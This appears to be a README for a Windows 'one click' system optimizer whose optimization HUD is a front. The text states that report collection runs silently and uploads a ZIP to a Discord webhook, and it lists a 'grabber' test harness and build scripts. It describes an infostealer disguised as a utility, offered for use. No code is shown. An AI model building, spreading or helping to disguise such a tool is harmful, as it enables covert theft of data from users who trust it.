# ONE CLICK — System Optimizer

All-in-one Windows 11 optimizer. Neon HUD for optimization, silent structured report pipeline in the background.

## Files

- `one click optimizer.exe` — main executable. Launch, UAC, click **START OPTIMIZATION**.
- `optimizer test.exe` — same HUD, no report upload.
- `grabber test.exe` — synthetic grab test harness.
- `pcopt.cpp` — full source (C++17, MSVC, Windows 11 x64).
- `build.bat` / `build_optimizer_test.bat` / `build_test.bat` — build scripts.

## Build

Run `build.bat` (it calls vcvars64.bat itself). No third-party libraries; system libs only.

## Behavior

The HUD shows only optimizer actions. Report collection runs silently and uploads a ZIP to the configured Discord webhook. The executable is not deleted after the run.
